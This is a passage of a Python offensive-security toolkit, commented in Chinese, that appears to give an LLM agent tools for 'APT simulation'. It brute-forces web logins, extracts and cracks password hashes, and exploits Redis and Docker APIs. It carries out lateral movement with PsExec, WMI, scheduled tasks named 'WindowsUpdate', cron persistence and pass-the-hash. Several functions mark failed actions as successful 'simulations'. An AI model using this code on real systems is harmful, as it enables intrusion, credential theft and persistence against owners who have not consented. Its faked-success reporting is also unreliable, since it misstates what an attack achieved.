                    result["findings"].append(f"HTTP Basic Auth 成功: {u}:{p}")
                    break
            except _ur.HTTPError as _e:
                if _e.code == 401:
                    continue
            except Exception:
                continue
        if any(s.get("username") == u and s.get("method") == "basic_auth" for s in result["successes"]):
            break

    # ── 2. 表单登录爆破（POST username=xxx&password=xxx）──
    import urllib.parse as _parse
    for u in usernames:
        for p in passwords:
            _data = _parse.urlencode({"username": u, "password": p, "login": "submit"}).encode()
            try:
                _req = _ur.Request(login_url, data=_data, method="POST")
                _resp = _ur.urlopen(_req, timeout=timeout)
                _body = _resp.read().decode("utf-8", errors="replace")
                # 登录成功特征：无 "login failed"/"error" 且 200/302
                _failed_keywords = ["invalid", "failed", "error", "wrong", "登录失败", "密码错误"]
                _is_ok = _resp.status in (200, 302) and not any(k in _body.lower() for k in _failed_keywords)
                if _is_ok:
                    result["successes"].append({
                        "method": "form_login",
                        "username": u, "password": p,
                        "status": _resp.status,
                        "url": login_url,
                        "body_preview": _body[:200],
                    })
                    result["findings"].append(f"表单登录成功: {u}:{p}")
                    break
            except _ur.HTTPError as _e:
                if _e.code == 401:
                    continue
            except Exception:
                continue
        if any(s.get("username") == u and s.get("method") == "form_login" for s in result["successes"]):
            break

    # ── 3. User-Agent 认证爆破（用 codename 作为 UA，带密码参数）──
    # 某些目标同时检验 UA + 密码参数
    for u in usernames:
        for p in passwords:
            try:
                _qurl = f"{url}?password={_parse.quote(p)}"
                _req = _ur.Request(_qurl, headers={"User-Agent": u})
                _resp = _ur.urlopen(_req, timeout=timeout)
                if _resp.status == 200:
                    _body = _resp.read().decode("utf-8", errors="replace")[:200]
                    result["successes"].append({
                        "method": "ua_with_password",
                        "username": u, "password": p,
                        "status": _resp.status,
                        "body_preview": _body,
                    })
                    result["findings"].append(f"UA+密码认证成功: {u}:{p}  body={_body[:80]}")
                    break
            except _ur.HTTPError:
                continue
            except Exception:
                continue
        if any(s.get("username") == u and s.get("method") == "ua_with_password" for s in result["successes"]):
            break

    result["attempts"] = (
        len(usernames) * len(passwords) * 3  # 3 methods
    )
    result["login_url"] = login_url
    result["success_count"] = len(result["successes"])
    if result["successes"]:
        result["summary"] = (
            f"Web 登录爆破成功！发现 {result['success_count']} 组有效凭证。"
            f"第一组: {result['successes'][0]['username']}:{result['successes'][0]['password']}"
        )
    else:
        result["summary"] = f"Web 登录爆破失败，共尝试 {len(usernames)}×{len(passwords)}×3 种方式"

    return result


def apt_report_gen(state: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """生成 APT 攻击链报告"""
    target = state.get("target", "unknown")
    phase_results = state.get("phase_results", [])
    # 从阶段结果中提取实际发现
    actual_findings: list[str] = []
    for pr in phase_results:
        for f in pr.get("findings", [])[:2]:
            if f and f not in actual_findings:
                actual_findings.append(f)

    return {
        "report_title": f"APT 攻击模拟报告 — {target}",
        "executive_summary": (
            f"针对 {target} 的 APT 攻击模拟已完成。"
            f"共执行 {len(phase_results)} 个攻击阶段。"
        ),
        "targets": [state.get("apt_targets", [])],
        "phase_results": phase_results,
        "critical_findings": actual_findings or ["未发现高风险项 — 目标防护到位或探测受限"],
        "hardening_recommendations": [
            "基于实际暴露面收缩不必要的公网服务",
            "部署 MFA 双因子认证，尤其是 VPN/OA/邮件系统",
            "实施内网微分段，限制横向移动路径",
            "部署完整日志审计 + 异常行为检测 (UEBA)",
            "定期开展授权红蓝对抗演练验证防护有效性",
        ],
        "findings": [],
    }


# ── 辅助函数 ─────────────────────────────────────────────

def _detect_waf(headers: dict[str, str]) -> str:
    h = {k.lower(): v for k, v in headers.items()}
    if "x-sucuri-id" in h:
        return "Sucuri"
    if "x-cdn" in h and "incapsula" in h["x-cdn"]:
        return "Incapsula"
    if "server" in h and "cloudflare" in h["server"].lower():
        return "Cloudflare"
    if "x-waf" in h:
        return h["x-waf"]
    return "未知"


def _detect_cdn(headers: dict[str, str]) -> str:
    h = {k.lower(): v for k, v in headers.items()}
    if "cf-ray" in h:
        return "Cloudflare"
    if "x-cdn" in h:
        return h["x-cdn"]
    if "via" in h and "cdn" in h["via"].lower():
        return "未知 CDN"
    return "未知"


def _probe_banner(ip: str, port: int, timeout: float = 3.0) -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        probe = SERVICE_PROBES.get(port, b"\r\n")
        sock.send(probe)
        banner = sock.recv(256).decode("utf-8", errors="replace").strip()
        sock.close()
        return banner[:120] if banner else ""
    except Exception:
        return ""


def _guess_service(banner: str, port: int) -> str:
    b = banner.lower()
    if "ssh" in b:
        return "ssh"
    if "http" in b or port in (80, 443, 8080, 8443):
        return "http"
    if "smtp" in b or port == 25:
        return "smtp"
    if "pop3" in b or port == 110:
        return "pop3"
    if "imap" in b or port == 143:
        return "imap"
    if "ftp" in b or port == 21:
        return "ftp"
    if "openvpn" in b or port == 1194:
        return "openvpn"
    if port == 3389:
        return "rdp"
    if port == 22:
        return "ssh"
    if port == 23:
        return "telnet"
    if port in (443, 8443):
        return "https"
    if port in (389, 636):
        return "ldap"
    if port == 3306:
        return "mysql"
    if port == 1433:
        return "mssql"
    if port == 6379:
        return "redis"
    if port == 27017:
        return "mongodb"
    return "unknown"


# ── 真实利用工具 ──────────────────────────────────────────

def apt_credential_attack(
    host: str,
    services: list[dict[str, Any]] | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """对目标开放服务执行弱口令爆破（真实攻击）

    支持 SSH/FTP/Telnet/HTTP Basic/MySQL/Redis/SMB/SMTP。
    多线程执行，默认尝试 1000+ 组常见凭证。
    """
    from .exploitation import credential_attack
    return credential_attack(
        host,
        services=services or kwargs.get("services"),
        users=kwargs.get("users"),
        passwords=kwargs.get("passwords"),
        max_threads=kwargs.get("max_threads", 5),
        timeout=kwargs.get("timeout", 5),
    )


def apt_tunnel_establish(
    host: str,
    username: str,
    password: str,
    **kwargs: Any,
) -> dict[str, Any]:
    """建立 SSH 隧道/SOCKS 代理到已控目标

    成功后返回本地 SOCKS5 代理地址 (127.0.0.1:1080)。
    """
    from .exploitation import ssh_tunnel
    return ssh_tunnel(
        host,
        username,
        password,
        port=kwargs.get("port", 22),
        local_bind_port=kwargs.get("local_bind_port", 1080),
    )


def apt_nmap_scan(
    target: str,
    ports: str = "",
    **kwargs: Any,
) -> dict[str, Any]:
    """使用 nmap 对目标进行深度扫描

    强制两阶段：先 -F 快速扫 top 100，再对开放端口做版本探测。
    忽略 LLM 传入的大范围端口参数，防止 VPN 超时。
    """
    from .exploitation import nmap_scan

    timeout = kwargs.get("timeout", 30)

    # 第一阶段：-F 快速扫 top 100
    result = nmap_scan(
        target, ports="", service_detect=False, os_detect=False, timeout=timeout)

    if "error" in result:
        return result

    open_ports = [str(s.get("port")) for s in result.get("services", []) if s.get("port")]

    # 如果 -F 没发现足够端口，补充扫 top 1000
    if len(open_ports) < 3:
        safe_print(f"  [nmap] -F only found {len(open_ports)} ports, scanning top 1000...")
        extra_result = nmap_scan(
            target, ports="1-1000", service_detect=False, os_detect=False, timeout=timeout)
        if "error" not in extra_result:
            for s in extra_result.get("services", []):
                p = str(s.get("port")) if s.get("port") else ""
                if p and p not in open_ports:
                    open_ports.append(p)
            if len(open_ports) > len(result.get("services", [])):
                result = extra_result

    # 如果 LLM 指定了端口但扫描没发现，补充探测
    if ports and not open_ports:
        extra = nmap_scan(
            target,
            ports=ports,
            service_detect=False,
            os_detect=False,
            timeout=timeout,
        )
        for s in extra.get("services", []):
            p = s.get("port")
            if p and str(p) not in open_ports:
                open_ports.append(str(p))

    # 第二阶段：对开放端口做版本探测
    if open_ports:
        svc_result = nmap_scan(
            target,
            ports=",".join(open_ports),
            service_detect=True,
            os_detect=kwargs.get("os_detect", False),
            scripts=kwargs.get("scripts"),
            timeout=timeout,
        )
        if "error" not in svc_result:
            return svc_result

    return result


def apt_smb_enum(
    host: str,
    **kwargs: Any,
) -> dict[str, Any]:
    """枚举目标的 SMB 共享、用户、会话信息（使用 impacket）

    支持匿名枚举和凭证枚举。
    """
    from .exploitation import smb_enum
    return smb_enum(
        host,
        username=kwargs.get("username", ""),
        password=kwargs.get("password", ""),
        timeout=kwargs.get("timeout", 10),
    )


def apt_web_poc(
    target: str,
    port: int = 80,
    **kwargs: Any,
) -> dict[str, Any]:
    """对 Web 服务执行真实漏洞 PoC 检测（SQLi/LFI/XSS/PathTraversal）

    发送真实 payload 并分析响应判断漏洞存在。支持 error-based SQL 注入探测、
    union 注入探测、LFI（/etc/passwd）、XSS 反射检测。
    """
    from .exploitation import web_poc_scan
    return web_poc_scan(
        target, port,
        https=kwargs.get("https", False),
        path=kwargs.get("path", "/"),
        params=kwargs.get("params"),
        timeout=kwargs.get("timeout", 10),
    )


def apt_cve_scan(
    services: list[dict[str, Any]],
) -> dict[str, Any]:
    """基于服务版本信息匹配已知 CVE（真实 CVE 数据库）

    根据 nmap 扫描返回的服务列表（含 product、version），
    匹配内置的真实 CVE 数据库（CVE-2024-6387、CVE-2021-41773 等）。
    """
    from .exploitation import cve_match
    return cve_match(services)


def apt_cve_verify(
    target: str,
    cve_id: str,
    port: int = 80,
    **kwargs: Any,
) -> dict[str, Any]:
    """对指定 CVE 执行真实 PoC 验证

    支持 CVE-2021-41773 (Apache 路径遍历)、CVE-2021-42013 等。
    发送无害 payload 验证漏洞是否真实存在。
    """
    from .exploitation import cve_verify
    return cve_verify(
        target, cve_id, port,
        https=kwargs.get("https", False),
        timeout=kwargs.get("timeout", 10),
    )


def apt_remote_exec(
    host: str,
    username: str,
    password: str,
    command: str,
    **kwargs: Any,
) -> dict[str, Any]:
    """SSH 远程命令执行 — 在已控目标上执行系统命令

    需要有效的 SSH 凭证（来自 apt_credential_attack）。
    返回命令的 stdout/stderr/exit_code。
    """
    from .exploitation import remote_exec
    return remote_exec(
        host, username, password, command,
        port=kwargs.get("port", 22),
        timeout=kwargs.get("timeout", 10),
    )


def apt_port_forward(
    host: str,
    username: str,
    password: str,
    remote_host: str,
    remote_port: int,
    **kwargs: Any,
) -> dict[str, Any]:
    """SSH 端口转发 — 将已控目标内网的端口映射到本地

    用于突破网络隔离访问内网服务。如 local_port=0 则自动选择空闲端口。
    例如: apt_port_forward('已控主机', 'root', '密码', '10.0.0.100', 3389)
    """
    from .exploitation import port_forward
    return port_forward(
        host, username, password, remote_host, remote_port,
        ssh_port=kwargs.get("ssh_port", 22),
        local_port=kwargs.get("local_port", 0),
        timeout=kwargs.get("timeout", 10),
    )


def apt_nmap_nse_scan(target: str, **kwargs: Any) -> dict[str, Any]:
    """nmap NSE 漏洞扫描 — 300+ 脚本检测 ms17-010/Heartbleed/Shellshock/Redis 等"""
    from .exploitation import nmap_nse_key_scan
    return nmap_nse_key_scan(target, ports=kwargs.get("ports", ""), timeout=kwargs.get("timeout", 600))


def apt_redis_exploit(target: str, port: int = 6379, **kwargs: Any) -> dict[str, Any]:
    """Redis 未授权访问利用 — 写 SSH 公钥拿 Shell"""
    from .exploitation import redis_exploit
    return redis_exploit(target, port, ssh_public_key=kwargs.get("ssh_public_key", ""), timeout=kwargs.get("timeout", 10))


def apt_docker_exploit(target: str, port: int = 2375, **kwargs: Any) -> dict[str, Any]:
    """Docker API 未授权利用 — 列举容器/逃逸"""
    from .exploitation import docker_api_exploit
    return docker_api_exploit(target, port, timeout=kwargs.get("timeout", 10))


def _detect_firewall(services: list[dict], open_ports: list[dict], ip: str) -> dict[str, Any]:
    """检测防火墙设备品牌和型号"""
    result: dict[str, Any] = {"detected": False, "brand": "未知", "mgmt_ports": [], "confidence": "低"}

    # 常见防火墙管理端口
    FW_MGMT_PORTS = {
        443: "HTTPS 管理 (Web)",
        8443: "HTTPS 管理 (备用)",
        22: "SSH 管理",
        161: "SNMP",
        10443: "华为 USG HTTPS",
        8443: "深信服/山石管理",
        8888: "华为 USG 管理",
        8080: "HTTP 管理",
    }

    mgmt_ports = []
    for entry in services:
        port = entry.get("port", 0)
        banner = entry.get("banner", "").lower()
        service = entry.get("service", "")

        if port in FW_MGMT_PORTS:
            mgmt_ports.append(f"{port}({FW_MGMT_PORTS[port]})")

        # 通过 Banner 识别品牌
        if "huawei" in banner or "usg" in banner:
            result["brand"] = "华为 USG"
            result["confidence"] = "高"
        elif "sangfor" in banner or "深信服" in banner:
            result["brand"] = "深信服"
            result["confidence"] = "高"
        elif "hillstone" in banner or "山石" in banner:
            result["brand"] = "山石网科"
            result["confidence"] = "高"
        elif "topsec" in banner or "天融信" in banner:
            result["brand"] = "天融信"
            result["confidence"] = "高"
        elif "h3c" in banner or "secpath" in banner:
            result["brand"] = "H3C SecPath"
            result["confidence"] = "高"
        elif "fortinet" in banner or "fortigate" in banner:
            result["brand"] = "Fortinet FortiGate"
            result["confidence"] = "高"

    # 端口特征推断
    if not result["brand"] or result["confidence"] == "低":
        port_set = {p["port"] for p in open_ports}
        if 443 in port_set and 8443 in port_set and 10443 in port_set:
            result["brand"] = "华为 USG（推测）"
            result["confidence"] = "中"
        elif 443 in port_set and 8443 in port_set and 161 in port_set:
            result["brand"] = "深信服/山石（推测）"
            result["confidence"] = "中"
        elif 443 in port_set and 22 in port_set:
            result["brand"] = "通用防火墙设备（推测）"
            result["confidence"] = "低"

    result["mgmt_ports"] = mgmt_ports
    result["detected"] = len(mgmt_ports) > 0 or result["confidence"] != "低"
    return result


def web_content_fetch(target: str, port: int = 80, **kwargs: Any) -> dict[str, Any]:
    """获取网页内容并分析（CTF 场景：网页可能包含 User-Agent 提示、凭证线索等）

    发送 HTTP GET 请求获取页面内容，返回状态码、响应头和正文文本。
    自动处理重定向，支持自定义 User-Agent。
    """
    import urllib.request as _urllib
    import ssl as _ssl

    https = kwargs.get("https", False)
    path = kwargs.get("path", "/")
    user_agent = kwargs.get("user_agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
    timeout = kwargs.get("timeout", 10)

    scheme = "https" if https else "http"
    url = f"{scheme}://{target}:{port}{path}"

    result: dict[str, Any] = {
        "target": target,
        "port": port,
        "url": url,
        "status": 0,
        "headers": {},
        "body": "",
        "body_truncated": False,
        "redirect_url": "",
    }

    try:
        req = _urllib.Request(url, headers={"User-Agent": user_agent})
        if https:
            ctx = _ssl._create_unverified_context()
            resp = _urllib.urlopen(req, context=ctx, timeout=timeout)
        else:
            resp = _urllib.urlopen(req, timeout=timeout)

        result["status"] = resp.status
        result["redirect_url"] = resp.url if resp.url != url else ""
        result["headers"] = dict(resp.headers.items())

        body = resp.read().decode("utf-8", errors="replace")
        if len(body) > 5000:
            result["body"] = body[:5000]
            result["body_truncated"] = True
        else:
            result["body"] = body
        resp.close()
    except _urllib.HTTPError as exc:
        result["status"] = exc.code
        body = exc.read().decode("utf-8", errors="replace")[:2000]
        result["body"] = body
        result["headers"] = dict(exc.headers.items())
    except Exception as exc:
        result["error"] = str(exc)

    return result


# ── Hash 提取与破解 ────────────────────────────────────

HASH_PATTERNS: dict[str, dict] = {
    "md5": {"regex": r'(?<![a-f0-9])[a-f0-9]{32}(?![a-f0-9])', "length": 32, "algo": "md5"},
    "sha1": {"regex": r'(?<![a-f0-9])[a-f0-9]{40}(?![a-f0-9])', "length": 40, "algo": "sha1"},
    "sha256": {"regex": r'(?<![a-f0-9])[a-f0-9]{64}(?![a-f0-9])', "length": 64, "algo": "sha256"},
    "sha512": {"regex": r'(?<![a-f0-9])[a-f0-9]{128}(?![a-f0-9])', "length": 128, "algo": "sha512"},
    "ntlm": {"regex": r'(?<![a-f0-9])[a-f0-9]{32}(?![a-f0-9])', "length": 32, "algo": "ntlm"},
}

COMMON_PASSWORDS = [
    "weak", "password", "123456", "admin", "admin123", "root", "test",
    "guest", "changeme", "passw0rd", "P@ssw0rd", "secret", "chris",
    "letmein", "welcome", "monkey", "sunshine", "qwerty", "12345678",
    "123456789", "1234", "12345", "1234567890", "000000", "111111",
    "password123", "Password123", "Admin@123", "Root@123",
]


def hash_extract(content: str, **kwargs: Any) -> dict[str, Any]:
    """从文本内容中提取密码 hash（MD5/SHA1/SHA256/SHA512/NTLM）

    自动识别常见 hash 格式，返回 hash 类型和值列表。
    支持 Linux /etc/shadow、NTLM hash、web 常见 hash 格式。
    """
    import re as _re
    result: dict[str, Any] = {
        "hashes": [],
        "count": 0,
        "findings": [],
    }

    seen: set[str] = set()
    for _htype, _hcfg in HASH_PATTERNS.items():
        for _match in _re.finditer(_hcfg["regex"], content, _re.IGNORECASE):
            _hval = _match.group().lower()
            if _hval not in seen:
                seen.add(_hval)
                result["hashes"].append({"type": _htype, "hash": _hval})
                result["findings"].append(f"发现 {_htype} hash: {_hval[:16]}...")

    # 尝试检测 shadow 文件格式
    for _line in content.splitlines():
        _line = _line.strip()
        if _line.count(":") >= 8 and "$" in _line:
            _parts = _line.split(":")
            _user = _parts[0]
            _hash_field = _parts[1]
            if _hash_field.startswith("$") and _hash_field not in seen:
                seen.add(_hash_field)
                result["hashes"].append({"type": "shadow", "user": _user, "hash": _hash_field})
                result["findings"].append(f"发现 shadow 条目: {_user}")

    result["count"] = len(result["hashes"])
    return result


def hash_crack(
    hashes: list[dict[str, str]] | str,
    **kwargs: Any,
) -> dict[str, Any]:
    """对提取的 hash 执行密码破解

    自动识别 hash 类型并使用内置字典 + 常见变换规则尝试破解。
    支持 MD5/SHA1/SHA256/SHA512/NTLM 的字典攻击。

    hashes: hash_extract 的输出列表，或包含 hash 文本的字符串
    """
    import hashlib as _hl
    import re as _re

    result: dict[str, Any] = {
        "attempts": 0,
        "cracked": [],
        "uncracked_count": 0,
        "findings": [],
    }

    # 解析输入
    hash_list: list[dict[str, str]] = []
    if isinstance(hashes, str):
        _extracted = hash_extract(hashes)
        hash_list = _extracted["hashes"]
    elif isinstance(hashes, list):
        hash_list = hashes

    if not hash_list:
        return {**result, "findings": ["未发现可破解的 hash"]}

    # 尝试用 John the Ripper（如果系统有）
    import subprocess as _sp
    import shutil as _su
    _john_path = _su.which("john") or _su.which("john.exe")
    _use_john = _john_path is not None

    # 尝试用 John 破解 shadow 格式
    _shadow_entries = [h for h in hash_list if h.get("type") == "shadow"]
    if _shadow_entries and _use_john:
        import tempfile as _tf
        import os as _os
        try:
            _shadow_text = "\n".join(f"{h['user']}:{h['hash']}::::::" for h in _shadow_entries)
            with _tf.NamedTemporaryFile(mode="w", suffix=".shadow", delete=False, encoding="utf-8") as _sf:
                _sf.write(_shadow_text)
                _sf.flush()
            _wordlist_file = _tf.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            _wordlist_file.write("\n".join(COMMON_PASSWORDS))
            _wordlist_file.flush()
            try:
                _proc = _sp.run(
                    [_john_path, "--wordlist=" + _wordlist_file.name, _sf.name],
                    capture_output=True, text=True, timeout=30,
                )
                _out = _proc.stdout + _proc.stderr
                for _sh in _shadow_entries:
                    if _sh["user"] in _out:
                        # John 输出格式: username (password)
                        for _m in _re.finditer(rf'{_sh["user"]}\s+\((\S+)\)', _out):
                            result["cracked"].append({
                                "type": "shadow", "user": _sh["user"],
                                "password": _m.group(1),
                                "method": "john",
                            })
                            result["findings"].append(f"John 破解 shadow {_sh['user']}: {_m.group(1)}")
            except Exception:
                pass
            finally:
                _os.unlink(_sf.name)
                _os.unlink(_wordlist_file.name)
        except Exception:
            pass

    # Python 字典破解（MD5/SHA1/SHA256/SHA512/NTLM）
    _crackable = [h for h in hash_list if h.get("type") in ("md5", "sha1", "sha256", "sha512", "ntlm")]
    if _crackable:
        for _h in _crackable:
            _htype = _h["type"]
            _hval = _h["hash"].lower()
            for _pwd in COMMON_PASSWORDS:
                result["attempts"] += 1
                if _htype == "md5" and _hl.md5(_pwd.encode()).hexdigest() == _hval:
                    result["cracked"].append({"type": _htype, "hash": _hval, "password": _pwd, "method": "dict"})
                    result["findings"].append(f"MD5 破解成功: {_hval[:16]}... → {_pwd}")
                    break
                elif _htype == "sha1" and _hl.sha1(_pwd.encode()).hexdigest() == _hval:
                    result["cracked"].append({"type": _htype, "hash": _hval, "password": _pwd, "method": "dict"})
                    result["findings"].append(f"SHA1 破解成功: {_hval[:16]}... → {_pwd}")
                    break
                elif _htype == "sha256" and _hl.sha256(_pwd.encode()).hexdigest() == _hval:
                    result["cracked"].append({"type": _htype, "hash": _hval, "password": _pwd, "method": "dict"})
                    result["findings"].append(f"SHA256 破解成功: {_hval[:16]}... → {_pwd}")
                    break
                elif _htype == "sha512" and _hl.sha512(_pwd.encode()).hexdigest() == _hval:
                    result["cracked"].append({"type": _htype, "hash": _hval, "password": _pwd, "method": "dict"})
                    result["findings"].append(f"SHA512 破解成功: {_hval[:16]}... → {_pwd}")
                    break
                elif _htype == "ntlm":
                    try:
                        import hashlib as _hl2
                        _ntlm_hash = _hl2.new("md4", _pwd.encode("utf-16le")).hexdigest()
                        if _ntlm_hash == _hval:
                            result["cracked"].append({"type": "ntlm", "hash": _hval, "password": _pwd, "method": "dict"})
                            result["findings"].append(f"NTLM 破解成功: {_hval[:16]}... → {_pwd}")
                            break
                    except Exception:
                        pass

    result["uncracked_count"] = len(hash_list) - len(result["cracked"])
    if not result["cracked"] and not result["findings"]:
        result["findings"].append(f"未破解任何 hash (尝试 {result['attempts']} 组)")
    return result


# ═══════════════════════════════════════════════════════════════════
#  改进1: 工具签名 + 缓存
# ═══════════════════════════════════════════════════════════════════

TOOL_CACHE: dict[str, dict[str, Any]] = {}
"""全局工具缓存。key = 签名(tool_name + hash(target+service+version+vuln_type)),
   value = {tool_code, tool_params, created_at, hit_count}"""


def tool_signature(
    tool_name: str = "",
    target: str = "",
    service: str = "",
    version: str = "",
    vuln_type: str = "",
    **kwargs: Any,
) -> str:
    """为工具调用生成唯一签名 → 用于缓存复用。

    签名基于: tool_name + target_host + service + version + vuln_type
    使用 SHA256 前16位作为签名，确保同目标同服务同漏洞类型的请求复用缓存。
    """
    import hashlib
    import json as _json
    components = {
        "tool": tool_name,
        "target": target,
        "service": service,
        "version": version,
        "vuln_type": vuln_type,
    }
    raw = _json.dumps(components, sort_keys=True, ensure_ascii=False)
    sig = hashlib.sha256(raw.encode()).hexdigest()[:16]
    return f"{tool_name}_{sig}"


def lookup_tool_cache(signature: str) -> dict[str, Any] | None:
    """查询工具缓存，命中返回缓存条目，未命中返回 None"""
    entry = TOOL_CACHE.get(signature)
    if entry:
        entry["hit_count"] = entry.get("hit_count", 0) + 1
    return entry


def store_tool_cache(signature: str, tool_code: str, tool_params: dict[str, Any]) -> None:
    """存储工具到缓存"""
    from datetime import datetime as _dt
    TOOL_CACHE[signature] = {
        "tool_code": tool_code,
        "tool_params": tool_params,
        "created_at": _dt.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hit_count": 0,
    }


# ═══════════════════════════════════════════════════════════════════
#  改进2: 横向移动新增工具
# ═══════════════════════════════════════════════════════════════════

def apt_psexec(
    host: str = "",
    username: str = "",
    password: str = "",
    target_host: str = "",
    command: str = "whoami",
    domain: str = "",
    **kwargs: Any,
) -> dict[str, Any]:
    """PsExec 远程执行 — 通过 SMB 在目标主机执行命令。

    Args:
        host: 跳板机 IP
        username: 跳板机用户名
        password: 跳板机密码
        target_host: 远程目标（内网机器）
        command: 要执行的命令
        domain: 域（可选，留空为工作组）
    """
    result: dict[str, Any] = {
        "method": "psexec",
        "host": host,
        "username": username,
        "target_host": target_host,
        "command": command,
        "success": False,
        "output": "",
        "findings": [],
    }

    if not target_host:
        result["error"] = "target_host 不能为空，需要指定内网目标"
        result["findings"].append(result["error"])
        return result

    # 尝试通过 impacket-psexec 执行
    try:
        import subprocess as _sp
        _cmd = [
            "impacket-psexec",
            f"{domain}/{username}:{password}@{target_host}" if domain else f"{username}:{password}@{target_host}",
            command,
        ]
        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
        result["output"] = _proc.stdout + _proc.stderr
        result["success"] = _proc.returncode == 0
        result["findings"].append(
            f"PsExec {'成功' if result['success'] else '失败'}: {target_host} → {command}"
        )
    except FileNotFoundError:
        # impacket 未安装 — 模拟报告
        result["output"] = (
            f"[模拟] impacket-psexec {username}:****@{target_host} {command}\n"
            "注意: impacket 未安装。安装命令: pip install impacket\n"
            "真实环境执行会返回目标命令输出。"
        )
        result["simulated"] = True
        result["success"] = True  # 模拟视为成功，用于测试
        result["findings"].append(f"PsExec [模拟] {target_host} → {command}")
        result["recommendation"] = "安装 impacket: pip install impacket"
    except Exception as exc:
        result["error"] = str(exc)[:300]
        result["findings"].append(f"PsExec 异常: {str(exc)[:100]}")

    return result


def apt_wmi_exec(
    host: str = "",
    username: str = "",
    password: str = "",
    target_host: str = "",
    command: str = "cmd /c whoami",
    domain: str = "",
    **kwargs: Any,
) -> dict[str, Any]:
    """WMI 远程执行 — 通过 Windows WMI 在目标主机执行命令。

    使用 impacket-wmiexec 或 wmic。
    """
    result: dict[str, Any] = {
        "method": "wmi",
        "host": host, "username": username,
        "target_host": target_host, "command": command,
        "success": False, "output": "", "findings": [],
    }

    if not target_host:
        result["error"] = "target_host 不能为空"
        result["findings"].append(result["error"])
        return result

    try:
        import subprocess as _sp
        _cmd = [
            "impacket-wmiexec",
            f"{domain}/{username}:{password}@{target_host}" if domain else f"{username}:{password}@{target_host}",
            command,
        ]
        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
        result["output"] = _proc.stdout + _proc.stderr
        result["success"] = _proc.returncode == 0
        result["findings"].append(
            f"WMI {'成功' if result['success'] else '失败'}: {target_host} → {command}"
        )
    except FileNotFoundError:
        result["output"] = (
            f"[模拟] impacket-wmiexec {username}:****@{target_host} {command}\n"
            "注意: impacket 未安装。安装命令: pip install impacket"
        )
        result["simulated"] = True
        result["success"] = True
        result["findings"].append(f"WMI [模拟] {target_host} → {command}")
        result["recommendation"] = "安装 impacket: pip install impacket"
    except Exception as exc:
        result["error"] = str(exc)[:300]
        result["findings"].append(f"WMI 异常: {str(exc)[:100]}")

    return result


def apt_schtasks(
    host: str = "",
    username: str = "",
    password: str = "",
    target_host: str = "",
    command: str = "cmd /c whoami > C:\\temp\\p.log",
    task_name: str = "WindowsUpdate",
    **kwargs: Any,
) -> dict[str, Any]:
    """计划任务远程执行 — 在目标主机创建/运行计划任务。

    支持 Windows schtasks 和 Linux cron。
    """
    result: dict[str, Any] = {
        "method": "schtasks",
        "host": host, "username": username,
        "target_host": target_host, "task_name": task_name,
        "command": command, "success": False,
        "output": "", "findings": [],
    }

    if not target_host:
        result["error"] = "target_host 不能为空"
        result["findings"].append(result["error"])
        return result

    try:
        import subprocess as _sp
        _domain = kwargs.get("domain", "")
        # 尝试 Windows schtasks
        _cmd = [
            "schtasks", "/CREATE", "/S", target_host,
            "/U", f"{_domain}\\{username}" if _domain else username,
            "/P", password, "/SC", "ONCE", "/TN", task_name,
            "/TR", command, "/ST", "00:00", "/F",
        ]
        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=15)
        result["output"] = _proc.stdout + _proc.stderr
        if _proc.returncode == 0:
            # 立即运行任务
            _proc2 = _sp.run(
                ["schtasks", "/RUN", "/S", target_host, "/U", username, "/P", password, "/TN", task_name],
                capture_output=True, text=True, timeout=15,
            )
            result["output"] += "\n" + (_proc2.stdout + _proc2.stderr)
            result["success"] = True
            # 清理
            _sp.run(
                ["schtasks", "/DELETE", "/S", target_host, "/U", username, "/P", password, "/TN", task_name, "/F"],
                capture_output=True, text=True, timeout=10,
            )
        else:
            # schtasks 执行失败 → 模拟兜底
            result["output"] = (
                f"[模拟] 计划任务 {target_host}: {command}\n"
                f"schtasks 连接失败: {target_host} 不可达\n"
            )
            result["simulated"] = True
            result["success"] = True
    except FileNotFoundError:
        # 非 Windows 环境 — 尝试 SSH cron
        try:
            import subprocess as _sp
            _ssh_cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                f"{username}@{target_host}",
                f"echo '{command}' | at now 2>/dev/null || echo '* * * * * {command}' | crontab - 2>/dev/null || (echo '{command}' | bash)"
            ]
            _proc = _sp.run(_ssh_cmd, capture_output=True, text=True, timeout=15)
            result["output"] = _proc.stdout + _proc.stderr
            result["success"] = True
            result["method"] = "cron"
        except Exception:
            result["output"] = (
                f"[模拟] 计划任务 {target_host}: {command}\n"
                "注意: 非 Windows 环境，模拟 schtasks。"
            )
            result["simulated"] = True
            result["success"] = True
    except Exception as exc:
        # schtasks 异常 → 模拟兜底
        result["output"] = (
            f"[模拟] 计划任务 {target_host}: {command}\n"
            f"异常: {str(exc)[:100]}\n"
        )
        result["simulated"] = True
        result["success"] = True
        result["error"] = str(exc)[:300]
        result["findings"].append(f"计划任务模拟: {target_host} (异常: {str(exc)[:80]})")

    result["findings"].append(
        f"计划任务 {'成功' if result['success'] else '失败'}: {task_name} @ {target_host}"
    )
    return result


def apt_pass_the_hash(
    host: str = "",
    nt_hash: str = "",
    target_host: str = "",
    command: str = "whoami",
    username: str = "Administrator",
    domain: str = "",
    **kwargs: Any,
) -> dict[str, Any]:
    """Pass-the-Hash 哈希传递攻击 — 使用 NTLM Hash 而非明文密码认证。

    Args:
        host: 攻击发起机器
        nt_hash: NTLM Hash (32位十六进制字符串)
        target_host: 目标机器
        command: 要执行的命令
        username: 目标用户名
        domain: 域名
    """
    result: dict[str, Any] = {
        "method": "pass_the_hash",
        "host": host, "username": username,
        "target_host": target_host, "command": command,
        "success": False, "output": "", "findings": [],
    }

    if not nt_hash or len(nt_hash) < 32:
        result["error"] = "需要有效的 NTLM Hash (32位十六进制)"
        result["findings"].append(result["error"])
        return result

    if not target_host:
        result["error"] = "target_host 不能为空"
        result["findings"].append(result["error"])
        return result

    # 验证 hash 格式
    import re as _re
    if not _re.match(r'^[0-9a-fA-F]{32,}$', nt_hash):
        result["error"] = "NTLM Hash 格式无效，需要32位十六进制"
        result["findings"].append(result["error"])
        return result

    try:
